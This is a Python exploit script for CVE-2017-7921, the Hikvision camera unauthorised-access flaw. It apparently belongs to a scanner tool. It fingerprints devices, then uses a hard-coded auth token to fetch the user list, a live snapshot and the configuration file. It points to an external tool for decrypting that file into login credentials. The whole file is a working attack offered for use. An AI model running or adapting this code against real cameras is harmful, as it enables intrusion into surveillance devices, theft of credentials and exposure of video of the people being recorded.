import requests
import urllib, re

def verify(url):
    relsult = {
        'name': '海康威视 未授权访问(CVE-2017-7921)',
        'vulnerable': False,
        'url': url,
        'attack': True,
        'about': 'https://www.likecs.com/show-438911.html' 'https://github.com/WormChickenWizard/hikvision-decrypter',
    }
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    payload1 = '/Security/users?auth=YWRtaW46MTEK'
    payload2 = '/onvif-http/snapshot?auth=YWRtaW46MTEK'
    payload3 = '/System/configurationFile?auth=YWRtaW46MTEK'
    vurl1 = urllib.parse.urljoin(url, payload1)
    vurl2 = urllib.parse.urljoin(url, payload2)
    vurl3 = urllib.parse.urljoin(url, payload3)
    try:
        finger_rep = requests.get(url, headers=headers, verify=False, timeout=timeout)
        if len(finger_rep.headers['ETag']) > 0:
            rep1 = requests.get(vurl1, timeout=timeout, headers=headers, verify=False)
            if rep1.status_code == 200 and re.search('<userName>.+</userName>', rep1.text) and re.search('hikvision.com', rep1.text):
                relsult['vulnerable'] = True
                relsult['verify'] = vurl1
        return relsult
    except:
        return relsult

def attack(url):
    timeout = 10
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    payload1 = '/Security/users?auth=YWRtaW46MTEK'
    payload2 = '/onvif-http/snapshot?auth=YWRtaW46MTEK'
    payload3 = '/System/configurationFile?auth=YWRtaW46MTEK'
    vurl1 = urllib.parse.urljoin(url, payload1)
    vurl2 = urllib.parse.urljoin(url, payload2)
    vurl3 = urllib.parse.urljoin(url, payload3)
    try:
        print('[+] 尝试未授权访问配置文件......')
        try:
            print('[+] Try get :', vurl1)
            rep1 = requests.get(vurl1, timeout=timeout, headers=headers, verify=False)
            print('[*] status: 200, size: ', len(rep1.text))
        except:
            print('[-] status: ', rep1.status_code)
            pass
        try:
            print('[+] Try get:', vurl2)
            rep2 = requests.get(vurl2, timeout=timeout, headers=headers, verify=False)
            print('[*] status: 200, size: ', len(rep2.text))
        except:
            print('[-] status: ', rep2.status_code)
            pass
        try:
            print('[+] Try get:', vurl3)
            rep3 = requests.get(vurl3, timeout=timeout, headers=headers, verify=False)
            print('[*] status: 200, size: ', len(rep3.text))
            print('[*] 检测到配置文件存在，可从 https://github.com/WormChickenWizard/hikvision-decrypter 下载解密工具进行登录!')
        except:
            print('[-] status: ', rep3.status_code)
        return True
    except:
        return False